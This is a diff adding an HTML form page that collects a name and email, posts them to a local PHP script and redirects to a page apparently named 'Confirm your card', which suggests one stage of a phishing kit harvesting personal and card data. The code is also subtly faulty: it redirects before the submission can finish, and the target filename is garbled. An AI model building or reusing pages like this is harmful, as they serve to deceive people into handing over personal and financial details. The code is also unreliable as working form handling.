@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Submission</title>
+</head>
+<body>
+    <form id="myForm" action="javascript:void(0);" method="post">
+        <!-- Your form fields here -->
+        <input type="text" name="name" placeholder="Name">
+        <input type="email" name="email" placeholder="Email">
+        <input type="submit" value="Submit">
+    </form>
+
+    <script>
+        function collectAndSend() {
+            // Get form data using FormData
+            var formData = new FormData(document.getElementById("myForm"));
+
+            // Optionally, perform any validation here
+
+            // Convert FormData to JSON object
+            var jsonData = {};
+            formData.forEach(function(value, key) {
+                jsonData[key] = value;
+            });
+
+            // Send the data to the server using fetch
+            fetch('collect_and_send.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(jsonData)
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Information sent successfully');
+                    // Redirect to the next page
+                    window.location.href = "Confirm your card inde..,,.html";
+                } else {
+                    console.error('Failed to send information');
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        // Attach the collectAndSend function to the form submission event
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent default form submission
+            collectAndSend(); // Call the collectAndSend function
+            // Redirect to the next page
+    window.location.href = "Confirm your card inde..,,.html";
+        });
+    </script>
+</body>
+</html>
